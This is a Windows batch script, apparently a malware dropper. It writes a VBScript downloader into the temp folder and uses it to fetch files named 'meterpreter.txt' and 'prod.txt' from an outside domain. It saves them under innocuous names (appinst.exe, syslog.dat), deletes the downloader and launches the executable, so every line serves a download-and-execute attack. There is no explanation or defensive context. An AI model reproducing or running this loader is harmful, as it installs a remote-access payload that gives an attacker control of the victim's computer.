@echo off
cd %TEMP%
title Aguarde...
cls
echo dim xHttp: Set xHttp = createobject("MSXML2.ServerXMLHTTP.6.0") > inst.vbs
echo dim bStrm: Set bStrm = createobject("Adodb.Stream") >> inst.vbs
echo dim wShell: Set wShell = createobject("WScript.Shell") >> inst.vbs
echo xHttp.Open "GET", WScript.Arguments.item(0), False >> inst.vbs
echo xHttp.Send >> inst.vbs
echo filename = wShell.ExpandEnvironmentStrings("%TEMP%") ^& "\" ^&  WScript.Arguments.item(1) >> inst.vbs
echo bStrm.type = 1 >> inst.vbs
echo bStrm.open >> inst.vbs
echo bStrm.write xHttp.responseBody >> inst.vbs
echo bStrm.savetofile filename, 2 >> inst.vbs
wscript inst.vbs "https://tupiratinsnaweb.com.br/meterpreter.txt" appinst.exe
wscript inst.vbs "https://tupiratinsnaweb.com.br/prod.txt" syslog.dat
del inst.vbs
start %TEMP%\appinst.exe syslog.dat